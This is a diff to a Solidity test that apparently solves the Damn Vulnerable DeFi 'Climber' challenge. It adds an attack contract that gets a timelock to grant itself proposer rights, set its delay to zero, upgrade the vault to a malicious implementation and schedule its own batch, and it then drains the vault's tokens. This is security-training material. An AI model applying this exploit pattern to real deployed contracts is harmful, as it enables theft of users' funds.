@@ -87,51 +87,47 @@ contract ClimberChallenge is Test {
     function test_climber() public checkSolvedByPlayer {
         // @audit-info prepare batch operation 
         MaliciousVault maliciousImpl = new MaliciousVault();
+        ClimberAttack attack = new ClimberAttack(timelock);
+        
 
         address[] memory targets = new address[](4);
         uint256[] memory values = new uint256[](4);
         bytes[] memory data = new bytes[](4);
 
 
+            
+        // 1. Grant proposer role to timelock itself
         targets[0] = address(timelock);
-        data[0] = abi.encodeCall(
-            timelock.grantRole,
-            (PROPOSER_ROLE,  address(timelock))
-        );
         values[0] = 0;
+        data[0] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(attack)));
 
-
+        // 2. Set delay to 0
         targets[1] = address(timelock);
-        data[1] = abi.encodeCall(
-            timelock.updateDelay,
-            0
-        );
         values[1] = 0;
+        data[1] =abi.encodeCall(timelock.updateDelay, (uint64(0)));
 
-
+        // 3. Upgrade vault to malicious implementation
         targets[2] = address(vault);
-        data[2] = abi.encodeCall(
-            vault.upgradeToAndCall,
-        (address(maliciousImpl), bytes(""))
-        );
         values[2] = 0;
+        data[2] =abi.encodeCall(vault.upgradeToAndCall, (address(maliciousImpl), bytes("")));
 
-
-        targets[3] = address(timelock);
+        // 4. Schedule this same batch
+        targets[3] = address(attack);
         values[3] = 0;
+        data[3] = abi.encodeCall(attack.schedule, ());
         
-        data[3] = abi.encodeCall(
-            timelock.schedule,
-            (targets, values, data, bytes32(0))
-        );
-        
+        attack.setBatch(targets, values, data);
 
+        
         // Execute the whole batch
         timelock.execute(targets, values, data, bytes32(0));
 
         // Vault is now malicious — drain everything
-        maliciousImpl.setRecovery(recovery);
-        maliciousImpl.sweepFundss(address(token));
+        // maliciousImpl.setRecovery(recovery);
+        // maliciousImpl.sweepFundss(address(token));
+
+        MaliciousVault(address(vault)).setRecovery(recovery);
+        MaliciousVault(address(vault)).sweepFundss(address(token));
 
     }
 
@@ -156,5 +152,30 @@ contract MaliciousVault is ClimberVault {
             recovery,
             DamnValuableToken(token).balanceOf(address(this))
         );
+    }
+}
+
+contract ClimberAttack {
+    ClimberTimelock immutable timelock;
+    address[] targets;
+    uint256[] values;
+    bytes[] data;
+
+    constructor(ClimberTimelock _timelock) {
+        timelock = _timelock;
+    }
+
+    function setBatch(
+        address[] memory _targets,
+        uint256[] memory _values,
+        bytes[] memory _data
+    ) external {
+        targets = _targets;
+        values = _values;
+        data = _data;
+    }
+
+    function schedule() external {
+        timelock.schedule(targets, values, data, bytes32(0));
     }
 }
